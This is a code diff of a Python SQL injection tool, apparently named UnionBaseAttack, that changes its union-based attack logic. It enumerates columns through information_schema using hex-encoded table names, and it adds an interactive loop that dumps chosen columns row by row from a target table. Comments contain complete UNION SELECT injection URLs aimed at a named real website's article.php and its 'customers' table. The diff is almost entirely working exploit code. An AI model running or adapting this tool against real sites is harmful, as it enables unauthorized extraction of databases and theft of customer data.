@@ -43,7 +43,7 @@ class UnionBaseAttack(object):
             for number in xrange(1, columns + 1):
                 list_injection_numbers.append(str(number) * 10)
             return list_injection_numbers
-
+    
         def create_url(columns):
             list_injection_numbers = list_injection_number(columns)
 
@@ -85,7 +85,6 @@ class UnionBaseAttack(object):
             sys.stdout.write("|\n\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n")
 
             return (raw_vuln_columns, success_InjectedString)
-
 
         def extract_database_name(tuple_var):
             for item in define_database_detection_query_php:
@@ -160,33 +159,26 @@ class UnionBaseAttack(object):
                 #extract column in table_name with convert query
                 column_extracted = list()
                 limit_counter = 0
-                counter = 0
+                query_ex_table_counter = 0
                 print TextColor.ENDC + "Please wait to get all column name in table %s ..." % (selected_table)
+                
                 while True:
-                    #http://www.jazzjournal.co.uk/article.php?id=-20%20UnIon%20SeLeCt%201111111111,%20CoNcaT(QUOTE(2134115356),%20ConVert(ColumN_NAME+UsIng+LAtin1),%20QUOTE(62134115356)),3333333333,4444444444,5555555555,6666666666,7777777777,8888888888,9999999999,10101010101010101010,11111111111111111111,12121212121212121212%20FROm%20iNforMation_sCheMa.COLUmns%20wHeRe%20tAblE_NamE=0x637573746f6d657273%20limit%200,%201%20%23
                     response = reqs.get(str(string.replace(tuple_var[1],
-                                                           tuple_var[0][0], define_get_columns_of_table_query_php[counter])
-                                                    + define_end_string_columns_of_table_query_php[counter] + "" + selected_table + ""
-                                                    + " limit %d, 1" % (limit_counter) + "%23"), headers=define_headerdata, verify=False)
-                    print response
-
-                    #todo= I must clean this section and change our main payload
-
-                    # print str(string.replace(tuple_var[1],
-                    #         tuple_var[0][0], define_get_columns_of_table_query_php[counter])
-                    #         + define_end_string_columns_of_table_query_php[counter] + "" + selected_table + ""
-                    #             + " limit %d, 1" % (limit_counter))
-
+                            tuple_var[0][0], define_get_columns_of_table_convert_query_php[query_ex_table_counter])
+                            + define_end_string_columns_of_table_query_php[query_ex_table_counter] + "0x" + selected_table.encode('hex') 
+                            + " limit %d, 1" % (limit_counter) + "%23"), headers=define_headerdata, verify=False)
+                    
                     if response.content.find("'2134115356'") is not -1:
-                        try:
-                            end = re.search("'2134115356'", response.content).end()
-                            start = re.search("'62134115356'", response.content).start()
-                            column_extracted.append(response.content[end:start])
-                            limit_counter = limit_counter + 1
-                        except:
-                            break
+                        end = re.search("'2134115356'", response.content).end()
+                        start = re.search("'62134115356'", response.content).start()
+                        column_extracted.append(response.content[end:start])
+                        limit_counter = limit_counter + 1
                     else:
-                        break
+                        if not column_extracted:
+                            query_ex_table_counter += 1
+                        else: 
+                            break
+                        #query_ex_table_counter += 1
 
                     lib.sleep(.5)
 
@@ -199,7 +191,43 @@ class UnionBaseAttack(object):
                     counter = counter + 1
                 print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"
 
-                #start from here
+                #http://www.jazzjournal.co.uk/article.php?id=-20%20Union%20Select%201,concat(QUOTE(2134115356),%20ConVert(customername+UsIng+LAtin1),%20QUOTE(62134115356)),3,%204,5,6,7,8,9,10,11,12%20from%20customers%20limit%200,1
+
+                data_extracted = list()
+                query_ex_column_counter = 0
+                limit_counter = 0
+                while True:
+                    column_num = raw_input('~#Enter column that you want to extract[enter exit to go back]: ')
+                    if column_num == "exit":
+                        break
+                    print
+                    selected_column = column_extracted[int(column_num)]
+                    
+                    response = reqs.get(str(string.replace(tuple_var[1],
+                            tuple_var[0][0], define_extract_columns_query_php[query_ex_column_counter]%(selected_column))
+                            + " FRoM " + selected_table +
+                            " limit %d, 1"%(limit_counter) + " %23"), headers=define_headerdata, verify=False)
+
+                    if response.content.find("'2134115356'") is not -1:
+                        end = re.search("'2134115356'", response.content).end()
+                        start = re.search("'62134115356'", response.content).start()
+                        data_extracted.append(response.content[end:start])
+                        limit_counter = limit_counter + 1
+                    else:
+                        if not data_extracted:
+                            query_ex_column_counter += 1
+                        else: break
+                    lib.sleep(.5)
+                    
+                    counter = 0
+                    make_table = lib.mytable(['Count', 'data'])
+                    for item in data_extracted:
+                        make_table.add_row([str(counter), item])
+                        counter += 1
+
+                    print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"
+
+        #start from here
         injection_string_tuple = create_url(columns)
         tuple_of_injectionString_and_vulnColumns = extract_number_of_vulnarable_columns(injection_string_tuple, columns)
         extract_database_name(tuple_of_injectionString_and_vulnColumns)
